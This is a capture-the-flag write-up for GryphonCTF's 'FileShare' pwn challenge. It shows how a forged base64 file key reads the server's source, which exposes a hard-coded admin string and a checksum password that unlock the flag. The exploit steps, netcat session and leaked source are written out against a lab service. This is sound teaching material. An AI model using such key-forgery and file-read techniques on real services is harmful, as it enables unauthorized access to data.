# FileShare
Pwn - 75 points

## Challenge 
> I created this service where you can leave files for other people to view! I have been getting good reviews..
what do you think about it?

> nc pwn1.chal.gryphonctf.com 17342

> Creator - @paux

## Solution

After creating a file, we are given a key in base64. It decodes to this form

    ['files/ABC', 'filename']

If we change the filename, the `VIEW FILE` still works as long as the directory is correct. This means only the directory matters!

Now I created a script to automatically encode and send the payload for us.
The payload is controlled by the parameters for `attempt()`

> [getFile.py](getFile.py)


---

If we key in a file not available, we get this 

##### Using [ `attempt("'files/ZZZ'", "'flag'")` ]

    FILE CONTENTS:
    Received: Traceback (most recent call last):
        File "/home/fileshare/FS.py", line 33, in gets
            f=open(kul+l[0],"r")
    FileNotFoundError: [Errno 2] No such file or directory: '/home/fileshare/files/ZZZ'
    Wrong key, no such file
    GOODBYE!

One thing we can see is that the source file is at `"/home/fileshare/FS.py"`
Let's take a look at the source!

##### Using [ `attempt("'FS.py'", "'flag'")` ]

We can see the source code!
I have saved a copy [FS.py](FS.py)

This portion is interesting

    def start(c,a,user):
        kkk="QQTLBFVLZFCJHABTKQWYYTBLTLNENP"
        try:
            < lots of stuff >

            if r=="a":
                c.sendall("YOU HAVE CHOSEN TO MAKE FILE!\nPLEASE INPUT NAME!(3-5 CHARAS ONLY) => ".encode())                
                < lots of stuff >
            elif r=="b":
                c.sendall("YOU HAVE CHOSEN TO VIEW FILE\nPLEASE INPUT KEY! => ".encode())
                < lots of stuff >

            elif r==kkk:
                f=open("/home/fileshare/flag/thisisalongnameforadirectoryforareasonflag.txt","r")
                k=f.readline()
                z="HELLO ADMINISTRATOR!\n~~~WELCOME TO THE ADMIN PORTAL~~~\n           a)  LIST ALL FILES\n           b)  PRINT FLAG\nYOUR INPUT => "
                c.sendall(z.encode())
                c.settimeout(60*2)
                h=c.recv(3).decode().strip()
                if h=="a":
                    k=os.listdir("/home/fileshare/files/")
                    for i in k:
                        i="- "+i+"\n"
                        c.sendall(i.encode())
                    c.sendall("GOODBYE\n".encode())
                elif h=="b":
                    c.sendall("PASSWORD PLS ! =>".encode())
                    c.settimeout(60*2)
                    z=c.recv(10).decode().strip()
                    if int(z)==check("REALADMIN"):
                        c.sendall("HERES THE FLAG!\n".encode())
                        c.sendall(k.encode())
                    else:
                        c.sendall("YOU ARE NOT REAL ADMIN! BYE\n".encode())
                else:
                    c.sendall("INVALID!\nGOODBYE!\n".encode());
                c.close()

As we can see, we must enter `QQTLBFVLZFCJHABTKQWYYTBLTLNENP` for the first input, and then `b` to print the flag.

Next, we must enter an integer which is compared to `check("REALADMIN")`. 

    >>> def check(stri):
    ...     k=0
    ...     for i in stri:
    ...         k=k+ord(i)
    ...     return k
    ... 
    >>> check("REALADMIN")
    653

The integer is `653`. Let's try it now!

    $ nc pwn1.chal.gryphonctf.com 17342
    
    ...

    WELCOME TO THE GREATEST FILE SHARING SERVICE IN ALL OF ZE WORLD!
        a)  CREATE FILE
        b)  VIEW FILE
    YOUR INPUT => QQTLBFVLZFCJHABTKQWYYTBLTLNENP

    HELLO ADMINISTRATOR!
    ~~~WELCOME TO THE ADMIN PORTAL~~~
        a)  LIST ALL FILES
        b)  PRINT FLAG
    YOUR INPUT => b

    PASSWORD PLS ! =>653

    HERES THE FLAG!
    GCTF{in53cur3_fi13_tr4n5f3r}


## Flag
`GCTF{in53cur3_fi13_tr4n5f3r}`